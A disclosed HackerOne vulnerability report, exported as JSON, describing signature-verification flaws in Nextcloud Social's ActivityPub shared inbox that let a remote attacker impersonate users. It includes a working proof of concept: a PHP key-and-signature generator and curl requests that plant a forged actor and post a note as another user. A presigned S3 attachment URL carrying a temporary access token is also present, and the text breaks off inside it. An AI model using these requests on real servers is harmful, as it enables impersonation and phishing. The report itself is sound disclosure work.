{"id":461308,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjEzMDg=","url":"https://hackerone.com/reports/461308","title":"Remote attacker can impersonate Social users via ActivityPub API","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2018-12-12T15:31:47.965Z","submitted_at":"2018-12-12T15:31:47.965Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tomk","url":"/tomk","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-02-01T08:57:05.404Z","bug_reporter_agreed_on_going_public_at":"2019-02-01T08:57:05.336Z","team_member_agreed_on_going_public_at":"2019-02-01T08:51:43.919Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi there! First up I want to acknowledge that Social may not be in scope. I emailed security@nextcloud.com, which pointed me here, and I wasn't sure whether to just put it in a GitHub issue. In any case I hope I'm not wasting your time.\n\nWhen an HTTP request arrives at the shared inbox endpoint there are problems in the Signature header checks. A remote unauthenticated attacker is able to partially impersonate users on the victim server. They can post messages on behalf of their victims, which will be visible in their own Home timelines and also in the Home timelines of any of their followers on the same server. Other actions are likely possible also, but this makes a clear example.\n\nI have verified the issue on Social 0.1.0 with NextCloud 15.0.0.\n\n* When an unknown remote Actor is downloaded using the keyId URL, the response's \"id\" field is not checked that it is from the same origin, which means it can be arbitrarily spoofed. This is the main problem.\n* When a Signature header is verified, any public key will do provided it comes from the correct origin, i.e., the key belongs to an Actor whose id has an origin that is somehow authoritative for the ActivityPub Item. This is normally okay since all the private keys for a given origin are on the same server. However due to the previous point, an attacker can insert their own pubkey for anybody else's server.\n\nThis is most clearly explained with steps to reproduce. Here I want to attack the server https://███████ and post a message impersonating \"testuser2\".\n\nFirst, I use a short PHP script `gen_request.php` that borrows some code from Social to generate a keypair, and give me a signature suitable for posting to the shared inbox.\n\n    \u003c?php\n\n    // Use same key type and generation code as inside Nextcloud social\n    $res = openssl_pkey_new(\n            [\n                    \"digest_alg\"       =\u003e \"rsa\",\n                    \"private_key_bits\" =\u003e 2048,\n                    \"private_key_type\" =\u003e OPENSSL_KEYTYPE_RSA,\n            ]\n    );\n\n    openssl_pkey_export($res, $privateKey);\n    $publicKey = openssl_pkey_get_details($res)['key'];\n\n    // Generate a valid request\n    $data = \"(request-target): post /nextcloud/index.php/apps/social/inbox\";\n\n    openssl_sign($data, $signed, $privateKey, OPENSSL_ALGO_SHA256);\n    echo \"Shared inbox request, signed\\n\";\n    echo base64_encode($signed);\n    echo \"\\n\\n\";\n    echo \"Public key\\n\";\n    echo $publicKey;\n\n    ?\u003e\n\nRunning this provides some material to use in the following requests.\n\n    Shared inbox request, signed\n    YHb7DroSsXgIFGuRFC5tRksVp1tayq+ZMeBP3vG6uNz8lStIjRhtCwzASStyRSrcm4DTlzuQzejQgQxJwq62bsPvzXzUGFub2yap3nyNFxtRbs/xTlpf1ySlhGDeMx1A9XjnEkp/j+wnCQF9j5h7SdnXG/1WSJe8SIBki+ONPwWqkyWRA1V/c76gJp349JnfVg0HkFuFGpIIe2A7Qk+Mbcq66aKx1WJedsL1SkeU3kSqSQIhYR4AvhXIHmj7E6Syg4o2/zHF0BaxbPHqS2VDSPajmE+gL+nhk/UTbOSUB6wzJkWng8ibWQ9Tz4UvYG/xUW8gdDtvU51x3nMfNmmXIQ==\n\n    Public key\n    -----BEGIN PUBLIC KEY-----\n    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmgjLAFCTvqwOCP1IW9Ik\n    peiTNBv49RC70dRXi4qpXLe+Sl2IR3O8YUiGzInRyyANM3nPWeHOH3bgF7WBmF5u\n    SaUgCga050woQC+DJkkVsjjmtz41z3FZyxRQN+x/zkJjQ96O94yWfXpam/hrW3Q2\n    WPHTEjKXyUfxIg0Ik0PcifvdZoCwQS+MbBDkKfToLw0vAhjKtE5zjT8VMwFj7yci\n    FpDzaKFHn4NQAr4SuznZW98zRom7XfcuDL5psa28W7S2Te2WVtCfUrkvbByESmN2\n    i3U5m0QjWUD34/IU03f+cyALKMNWesMl1mAj8NUfPgoGIa8ISlWYrjDzfGDjbbDc\n    /QIDAQAB\n    -----END PUBLIC KEY-----\n\nNext I download testuser2's user profile as a template.\n\n    $ curl -H \"Accept: application/ld+json\" -k https://████/nextcloud/index.php/apps/social/@testuser2\n\nEdit it so that the `id` field is changed to `@mallory`, and the public key is replaced with the one we generated. The rest can stay the same. (Truncated example)\n\n    {\"@context\":[\"https:\\/\\/www.w3.org\\/ns\\/activitystreams\",\"https:\\/\\/w3id.org\\/security\\/v1\"],\n    \"id\":\"https:\\/\\/█████\\/nextcloud\\/index.php\\/apps\\/social\\/@mallory\",\n    \"type\":\"Person\",\n    ...\n    +cyALKMNWesMl1mAj8NUfPgoGIa8ISlWYrjDzfGDjbbDc\\n/QIDAQAB\\n-----END PUBLIC KEY-----\\n\"}}\n\nI place this user JSON in a file on a web-accessible HTTPS server - in this case the URL is `https://███████/mallory.json`. I make the victim server download and process this user by using this URL as a keyId in a signature. The actual signature text and request body does not matter at this point. Verification will fail, but the user will be saved into the table \"oc_social_cache_actors\" with the \"id\" set to `https://████/nextcloud/index.php/apps/social/@mallory`. This makes it trusted for requests that concern origin ████.\n\n    $ curl -H 'Signature: keyId=\"https://██████/mallory.json\",headers=\"(request-target)\",signature=\"x\"' -H \"Accept: application/ld+json\" -X POST -d \"\" -k -i https://██████/nextcloud/index.php/apps/social/inbox\n    HTTP/1.1 500 Internal Server Error\n    ...\n    {\"status\":-1,\"exception\":\"OCA\\\\Social\\\\Exceptions\\\\SignatureException\",\"message\":\"signature cannot be checked\"}\n\nNow that mallory's pubkey is trusted, I can submit a Create-Note payload to the shared inbox. The signature for this request URL was already pre-calculated by the PHP script earlier.\n\nFor example,\n\n    $ curl -H 'Signature: keyId=\"https://███/nextcloud/index.php/apps/social/@mallory\",headers=\"(request-target)\",signature=\"YHb7DroSsXgIFGuRFC5tRksVp1tayq+ZMeBP3vG6uNz8lStIjRhtCwzASStyRSrcm4DTlzuQzejQgQxJwq62bsPvzXzUGFub2yap3nyNFxtRbs/xTlpf1ySlhGDeMx1A9XjnEkp/j+wnCQF9j5h7SdnXG/1WSJe8SIBki+ONPwWqkyWRA1V/c76gJp349JnfVg0HkFuFGpIIe2A7Qk+Mbcq66aKx1WJedsL1SkeU3kSqSQIhYR4AvhXIHmj7E6Syg4o2/zHF0BaxbPHqS2VDSPajmE+gL+nhk/UTbOSUB6wzJkWng8ibWQ9Tz4UvYG/xUW8gdDtvU51x3nMfNmmXIQ==\"' \\\n    -H \"Accept: application/ld+json\" \\\n    -X POST \\\n    -d \"{\\\"type\\\":\\\"Create\\\",\\\"actor\\\":\\\"https://█████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"to\\\":[\\\"https://www.w3.org/ns/activitystreams#Public\\\"],\\\"object\\\":{\\\"publishedTime\\\":1544622784,\\\"@context\\\":[\\\"https://www.w3.org/ns/activitystreams\\\",\\\"https://w3id.org/security/v1\\\"],\\\"id\\\":\\\"https://██████████/nextcloud/index.php/apps/social/@testuser2/15446114504147655329\\\",\\\"type\\\":\\\"Note\\\",\\\"to\\\":\\\"https://www.w3.org/ns/activitystreams#Public\\\",\\\"cc\\\":[\\\"https://████████/nextcloud/index.php/apps/social/@testuser2/followers\\\"],\\\"actor\\\":\\\"https://████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"actor_info\\\":{\\\"@context\\\":[\\\"https://www.w3.org/ns/activitystreams\\\",\\\"https://w3id.org/security/v1\\\"],\\\"id\\\":\\\"https://███████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"type\\\":\\\"Person\\\",\\\"url\\\":\\\"https://██████████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"local\\\":true,\\\"aliases\\\":[\\\"@testuser2\\\",\\\"users/testuser2\\\"],\\\"preferredUsername\\\":\\\"testuser2\\\",\\\"name\\\":\\\"\\\",\\\"inbox\\\":\\\"https://███/nextcloud/index.php/apps/social/@testuser2/inbox\\\",\\\"outbox\\\":\\\"https://███/nextcloud/index.php/apps/social/@testuser2/outbox\\\",\\\"account\\\":\\\"testuser2@█████\\\",\\\"following\\\":\\\"https://███████/nextcloud/index.php/apps/social/@testuser2/following\\\",\\\"followers\\\":\\\"https://█████/nextcloud/index.php/apps/social/@testuser2/followers\\\",\\\"endpoints\\\":{\\\"sharedInbox\\\":\\\"https://█████/nextcloud/index.php/apps/social/inbox\\\"},\\\"publicKey\\\":{\\\"id\\\":\\\"https://████████/nextcloud/index.php/apps/social/@testuser2#main-key\\\",\\\"owner\\\":\\\"https://████████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"publicKeyPem\\\":\\\"\\\"}},\\\"published\\\":\\\"2018-12-12T14:44:10+00:00\\\",\\\"local\\\":true,\\\"content\\\":\\\"not really testuser2\\\",\\\"attributedTo\\\":\\\"https://██████████/nextcloud/index.php/apps/social/@testuser2\\\",\\\"inReplyTo\\\":\\\"\\\",\\\"sensitive\\\":false,\\\"conversation\\\":\\\"\\\"}}\" \\\n    -k -i \\\n    https://████/nextcloud/index.php/apps/social/inbox\n\nNow the payload \"not really testuser2\" appears in the Home timeline of their followers, like the admin user in the attached screenshot.\n\n## Impact\n\n* Phishing or malware links via seemingly trustworthy local or remote users\n* Spam/DoS\n* Possibly deleting content (untested)","vulnerability_information_html":"\u003cp\u003eHi there! First up I want to acknowledge that Social may not be in scope. I emailed \u003ca title=\"security@nextcloud.com\" href=\"mailto:security@nextcloud.com\" rel=\"nofollow noopener noreferrer\"\u003esecurity@nextcloud.com\u003c/a\u003e, which pointed me here, and I wasn\u0026#39;t sure whether to just put it in a GitHub issue. In any case I hope I\u0026#39;m not wasting your time.\u003c/p\u003e\n\n\u003cp\u003eWhen an HTTP request arrives at the shared inbox endpoint there are problems in the Signature header checks. A remote unauthenticated attacker is able to partially impersonate users on the victim server. They can post messages on behalf of their victims, which will be visible in their own Home timelines and also in the Home timelines of any of their followers on the same server. Other actions are likely possible also, but this makes a clear example.\u003c/p\u003e\n\n\u003cp\u003eI have verified the issue on Social 0.1.0 with NextCloud 15.0.0.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eWhen an unknown remote Actor is downloaded using the keyId URL, the response\u0026#39;s \u0026quot;id\u0026quot; field is not checked that it is from the same origin, which means it can be arbitrarily spoofed. This is the main problem.\u003c/li\u003e\n\u003cli\u003eWhen a Signature header is verified, any public key will do provided it comes from the correct origin, i.e., the key belongs to an Actor whose id has an origin that is somehow authoritative for the ActivityPub Item. This is normally okay since all the private keys for a given origin are on the same server. However due to the previous point, an attacker can insert their own pubkey for anybody else\u0026#39;s server.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis is most clearly explained with steps to reproduce. Here I want to attack the server https://███████ and post a message impersonating \u0026quot;testuser2\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eFirst, I use a short PHP script \u003ccode\u003egen_request.php\u003c/code\u003e that borrows some code from Social to generate a keypair, and give me a signature suitable for posting to the shared inbox.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Use same key type and generation code as inside Nextcloud social\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopenssl_pkey_new\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e[\u003c/span\u003e\n                \u003cspan class=\"s2\"\u003e\u0026quot;digest_alg\u0026quot;\u003c/span\u003e       \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;rsa\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s2\"\u003e\u0026quot;private_key_bits\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e2048\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s2\"\u003e\u0026quot;private_key_type\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003eOPENSSL_KEYTYPE_RSA\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eopenssl_pkey_export\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$privateKey\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$publicKey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopenssl_pkey_get_details\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;key\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Generate a valid request\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;(request-target): post /nextcloud/index.php/apps/social/inbox\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eopenssl_sign\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$signed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$privateKey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eOPENSSL_ALGO_SHA256\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Shared inbox request, signed\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nb\"\u003ebase64_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$signed\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Public key\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$publicKey\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRunning this provides some material to use in the following requests.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eShared inbox request, signed\nYHb7DroSsXgIFGuRFC5tRksVp1tayq+ZMeBP3vG6uNz8lStIjRhtCwzASStyRSrcm4DTlzuQzejQgQxJwq62bsPvzXzUGFub2yap3nyNFxtRbs/xTlpf1ySlhGDeMx1A9XjnEkp/j+wnCQF9j5h7SdnXG/1WSJe8SIBki+ONPwWqkyWRA1V/c76gJp349JnfVg0HkFuFGpIIe2A7Qk+Mbcq66aKx1WJedsL1SkeU3kSqSQIhYR4AvhXIHmj7E6Syg4o2/zHF0BaxbPHqS2VDSPajmE+gL+nhk/UTbOSUB6wzJkWng8ibWQ9Tz4UvYG/xUW8gdDtvU51x3nMfNmmXIQ==\n\nPublic key\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmgjLAFCTvqwOCP1IW9Ik\npeiTNBv49RC70dRXi4qpXLe+Sl2IR3O8YUiGzInRyyANM3nPWeHOH3bgF7WBmF5u\nSaUgCga050woQC+DJkkVsjjmtz41z3FZyxRQN+x/zkJjQ96O94yWfXpam/hrW3Q2\nWPHTEjKXyUfxIg0Ik0PcifvdZoCwQS+MbBDkKfToLw0vAhjKtE5zjT8VMwFj7yci\nFpDzaKFHn4NQAr4SuznZW98zRom7XfcuDL5psa28W7S2Te2WVtCfUrkvbByESmN2\ni3U5m0QjWUD34/IU03f+cyALKMNWesMl1mAj8NUfPgoGIa8ISlWYrjDzfGDjbbDc\n/QIDAQAB\n-----END PUBLIC KEY-----\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNext I download testuser2\u0026#39;s user profile as a template.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl -H \u0026quot;Accept: application/ld+json\u0026quot; -k https://████/nextcloud/index.php/apps/social/@testuser2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eEdit it so that the \u003ccode\u003eid\u003c/code\u003e field is changed to \u003ccode\u003e@mallory\u003c/code\u003e, and the public key is replaced with the one we generated. The rest can stay the same. (Truncated example)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;@context\u0026quot;:[\u0026quot;https:\\/\\/www.w3.org\\/ns\\/activitystreams\u0026quot;,\u0026quot;https:\\/\\/w3id.org\\/security\\/v1\u0026quot;],\n\u0026quot;id\u0026quot;:\u0026quot;https:\\/\\/█████\\/nextcloud\\/index.php\\/apps\\/social\\/@mallory\u0026quot;,\n\u0026quot;type\u0026quot;:\u0026quot;Person\u0026quot;,\n...\n+cyALKMNWesMl1mAj8NUfPgoGIa8ISlWYrjDzfGDjbbDc\\n/QIDAQAB\\n-----END PUBLIC KEY-----\\n\u0026quot;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI place this user JSON in a file on a web-accessible HTTPS server - in this case the URL is \u003ccode\u003ehttps://███████/mallory.json\u003c/code\u003e. I make the victim server download and process this user by using this URL as a keyId in a signature. The actual signature text and request body does not matter at this point. Verification will fail, but the user will be saved into the table \u0026quot;oc_social_cache_actors\u0026quot; with the \u0026quot;id\u0026quot; set to \u003ccode\u003ehttps://████/nextcloud/index.php/apps/social/@mallory\u003c/code\u003e. This makes it trusted for requests that concern origin ████.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl -H \u0026#39;Signature: keyId=\u0026quot;https://██████/mallory.json\u0026quot;,headers=\u0026quot;(request-target)\u0026quot;,signature=\u0026quot;x\u0026quot;\u0026#39; -H \u0026quot;Accept: application/ld+json\u0026quot; -X POST -d \u0026quot;\u0026quot; -k -i https://██████/nextcloud/index.php/apps/social/inbox\nHTTP/1.1 500 Internal Server Error\n...\n{\u0026quot;status\u0026quot;:-1,\u0026quot;exception\u0026quot;:\u0026quot;OCA\\\\Social\\\\Exceptions\\\\SignatureException\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;signature cannot be checked\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow that mallory\u0026#39;s pubkey is trusted, I can submit a Create-Note payload to the shared inbox. The signature for this request URL was already pre-calculated by the PHP script earlier.\u003c/p\u003e\n\n\u003cp\u003eFor example,\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ curl -H \u0026#39;Signature: keyId=\u0026quot;https://███/nextcloud/index.php/apps/social/@mallory\u0026quot;,headers=\u0026quot;(request-target)\u0026quot;,signature=\u0026quot;YHb7DroSsXgIFGuRFC5tRksVp1tayq+ZMeBP3vG6uNz8lStIjRhtCwzASStyRSrcm4DTlzuQzejQgQxJwq62bsPvzXzUGFub2yap3nyNFxtRbs/xTlpf1ySlhGDeMx1A9XjnEkp/j+wnCQF9j5h7SdnXG/1WSJe8SIBki+ONPwWqkyWRA1V/c76gJp349JnfVg0HkFuFGpIIe2A7Qk+Mbcq66aKx1WJedsL1SkeU3kSqSQIhYR4AvhXIHmj7E6Syg4o2/zHF0BaxbPHqS2VDSPajmE+gL+nhk/UTbOSUB6wzJkWng8ibWQ9Tz4UvYG/xUW8gdDtvU51x3nMfNmmXIQ==\u0026quot;\u0026#39; \\\n-H \u0026quot;Accept: application/ld+json\u0026quot; \\\n-X POST \\\n-d \u0026quot;{\\\u0026quot;type\\\u0026quot;:\\\u0026quot;Create\\\u0026quot;,\\\u0026quot;actor\\\u0026quot;:\\\u0026quot;https://█████/nextcloud/index.php/apps/social/@testuser2\\\u0026quot;,\\\u0026quot;to\\\u0026quot;:[\\\u0026quot;https://www.w3.org/ns/activitystreams#Public\\\u0026quot;],\\\u0026quot;object\\\u0026quot;:{\\\u0026quot;publishedTime\\\u0026quot;:1544622784,\\\u0026quot;@context\\\u0026quot;:[\\\u0026quot;https://www.w3.org/ns/activitystreams\\\u0026quot;,\\\u0026quot;https://w3id.org/security/v1\\\u0026quot;],\\\u0026quot;id\\\u0026quot;:\\\u0026quot;https://██████████/nextcloud/index.php/apps/social/@testuser2/15446114504147655329\\\u0026quot;,\\\u0026quot;type\\\u0026quot;:\\\u0026quot;Note\\\u0026quot;,\\\u0026quot;to\\\u0026quot;:\\\u0026quot;https://www.w3.org/ns/activitystreams#Public\\\u0026quot;,\\\u0026quot;cc\\\u0026quot;:[\\\u0026quot;https://████████/nextcloud/index.php/apps/social/@testuser2/followers\\\u0026quot;],\\\u0026quot;actor\\\u0026quot;:\\\u0026quot;https://████/nextcloud/index.php/apps/social/@testuser2\\\u0026quot;,\\\u0026quot;actor_info\\\u0026quot;:{\\\u0026quot;@context\\\u0026quot;:[\\\u0026quot;https://www.w3.org/ns/activitystreams\\\u0026quot;,\\\u0026quot;https://w3id.org/security/v1\\\u0026quot;],\\\u0026quot;id\\\u0026quot;:\\\u0026quot;https://███████/nextcloud/index.php/apps/social/@testuser2\\\u0026quot;,\\\u0026quot;type\\\u0026quot;:\\\u0026quot;Person\\\u0026quot;,\\\u0026quot;url\\\u0026quot;:\\\u0026quot;https://██████████/nextcloud/index.php/apps/social/@testuser2\\\u0026quot;,\\\u0026quot;local\\\u0026quot;:true,\\\u0026quot;aliases\\\u0026quot;:[\\\u0026quot;@testuser2\\\u0026quot;,\\\u0026quot;users/testuser2\\\u0026quot;],\\\u0026quot;preferredUsername\\\u0026quot;:\\\u0026quot;testuser2\\\u0026quot;,\\\u0026quot;name\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;inbox\\\u0026quot;:\\\u0026quot;https://███/nextcloud/index.php/apps/social/@testuser2/inbox\\\u0026quot;,\\\u0026quot;outbox\\\u0026quot;:\\\u0026quot;https://███/nextcloud/index.php/apps/social/@testuser2/outbox\\\u0026quot;,\\\u0026quot;account\\\u0026quot;:\\\u0026quot;testuser2@█████\\\u0026quot;,\\\u0026quot;following\\\u0026quot;:\\\u0026quot;https://███████/nextcloud/index.php/apps/social/@testuser2/following\\\u0026quot;,\\\u0026quot;followers\\\u0026quot;:\\\u0026quot;https://█████/nextcloud/index.php/apps/social/@testuser2/followers\\\u0026quot;,\\\u0026quot;endpoints\\\u0026quot;:{\\\u0026quot;sharedInbox\\\u0026quot;:\\\u0026quot;https://█████/nextcloud/index.php/apps/social/inbox\\\u0026quot;},\\\u0026quot;publicKey\\\u0026quot;:{\\\u0026quot;id\\\u0026quot;:\\\u0026quot;https://████████/nextcloud/index.php/apps/social/@testuser2#main-key\\\u0026quot;,\\\u0026quot;owner\\\u0026quot;:\\\u0026quot;https://████████/nextcloud/index.php/apps/social/@testuser2\\\u0026quot;,\\\u0026quot;publicKeyPem\\\u0026quot;:\\\u0026quot;\\\u0026quot;}},\\\u0026quot;published\\\u0026quot;:\\\u0026quot;2018-12-12T14:44:10+00:00\\\u0026quot;,\\\u0026quot;local\\\u0026quot;:true,\\\u0026quot;content\\\u0026quot;:\\\u0026quot;not really testuser2\\\u0026quot;,\\\u0026quot;attributedTo\\\u0026quot;:\\\u0026quot;https://██████████/nextcloud/index.php/apps/social/@testuser2\\\u0026quot;,\\\u0026quot;inReplyTo\\\u0026quot;:\\\u0026quot;\\\u0026quot;,\\\u0026quot;sensitive\\\u0026quot;:false,\\\u0026quot;conversation\\\u0026quot;:\\\u0026quot;\\\u0026quot;}}\u0026quot; \\\n-k -i \\\nhttps://████/nextcloud/index.php/apps/social/inbox\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow the payload \u0026quot;not really testuser2\u0026quot; appears in the Home timeline of their followers, like the admin user in the attached screenshot.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003ePhishing or malware links via seemingly trustworthy local or remote users\u003c/li\u003e\n\u003cli\u003eSpam/DoS\u003c/li\u003e\n\u003cli\u003ePossibly deleting content (untested)\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"50.0","formatted_bounty":"$50","weakness":{"id":52,"name":"Deserialization of Untrusted Data"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":389448,"file_name":"admin_home.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/389/448/4199ce042385ae473a6c897a9279af5b34470659/admin_home.png?response-content-disposition=attachment%3B%20filename%3D%22admin_home.png%22%3B%20filename%2A%3DUTF-8%27%27admin_home.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3MMGRP5H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060130Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICEZ9R%2B2RJ3GrTP6l%2FPAFADJG1t55InVtXNQpLfOPgHaAiEA9vebVe9XdCpFDuGnxxWe2Ve48e%2FtAoig8YYxqZ7es78qtAMIUhABGgwwMTM2MTkyNzQ4NDkiDH6RMqd3Km1HzDzcXiqRAw9Zi9Zyah%2FL7m5qi9w2XsNDr%2F5ZZ%2F5Gny1bCMAgWHuEH9Lmtzfddi67Q3u82zHSnheCFLE%2BUTr6KCbyVouh2s6I1Iw5FpZ4LCl2Jts%2FOYIW3f51kFQhZ3sOfoeJ95jG2hfROCEhzpnA30iPS6xMNw87KO9Qo4x%2FBM37CIhv4A0%2FSU0JbwvczB01wva%2FQJkiH6lH1ZVS3EG6yUh%2Feq8kDGf%2FnGRgLcxw3MK7jT4GG1knwEEDIQOAuumsmWt3QDUH6dFWYx57C2QS76Xr1I1ub7Ob050enItoD3hnXR1F2lhC9JZWyDDS3sRTHvPx0voGVfuM803u8XTKLOZxTNSBY1S8m7RRU55us25%2B